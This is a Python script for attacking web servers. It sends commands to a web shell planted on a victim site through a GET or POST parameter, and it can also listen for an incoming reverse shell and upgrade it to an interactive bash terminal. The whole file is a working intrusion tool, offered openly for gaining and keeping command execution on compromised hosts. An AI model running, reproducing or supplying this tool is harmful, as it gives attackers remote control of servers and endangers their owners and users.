#!/usr/bin/env python

import requests
import argparse
import sys
import readline
import nclib
import tty
import termios
import os
import multiprocessing



parser = argparse.ArgumentParser()
history = []

parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used ( Default: GET)", default="GET", nargs=1)
parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked. Example: http://www.victim.com/vuln.php", required=True, nargs=1)
parser.add_argument("-D", "--debug", dest="debug", help="If set the programm does print debug messages", action='store_true', default=False)
parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a full functional reverse sehll", metavar="METHOD:LHOST:PORT", nargs=1)


def upgraded_shell():
    args.method = args.method.upper()
    if args.method not in ["GET", "POST"]:
        print(f"[!] Method {args.method} not recognized")
        sys.exit()
    try:
        method, ip, port = args.reverse[0].split(":")
        port = int(port)

        interactive_shell(ip, port)
    except (ValueError):
        print("[!] Could not parse METHOD:IP:PORT")



def interactive_shell(ip, port):
    nc = nclib.Netcat(listen=(ip, port))
    fd = sys.stdin.fileno()
    old_attr = termios.tcgetattr(fd)
    tty.setraw(fd)
    new_attr = termios.tcgetattr(fd)
    new_attr[3] = new_attr[3] & ~termios.ECHO
    try:
        termios.tcsetattr(fd, termios.TCSADRAIN, new_attr)
        columns, rows = os.get_terminal_size()
        nc.send(f"stty rows {rows} cols {columns}\n")
        nc.send('''python3 -c "import pty;pty.spawn('/bin/bash')"\n''')
        nc.send("reset\n")
        nc.interactive()
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_attr)

    

def web_shell():
    args.method = args.method.upper()
    if args.method not in ["GET", "POST"]:
        print(f"[!] Method {args.method} not recognized")
        sys.exit()
    if args.debug:
        print("[!] Shellbind is ready. You can run commands now")
    while True:
        try:
            command = input("$ ")
            if args.method == "GET":
                params = {args.para_name[0]: command}
                res = requests.get(args.host[0], params=params)
            else:
                params = {args.para_name[0]: command}
                res = requests.post(args.host[0], data=params)
            print(res.text)
        except requests.ConnectionError:
            host = args.host[0].replace("\n", "")
            print(f"[!] Connection to {host} not possible")
            sys.exit()
        except KeyboardInterrupt:
            if args.debug:
                print("[!] Exiting Connection to webshell")
            sys.exit()



args = parser.parse_args()
if __name__ == '__main__':
    
    if args.reverse is not None :
        upgraded_shell()
    else:
        web_shell()




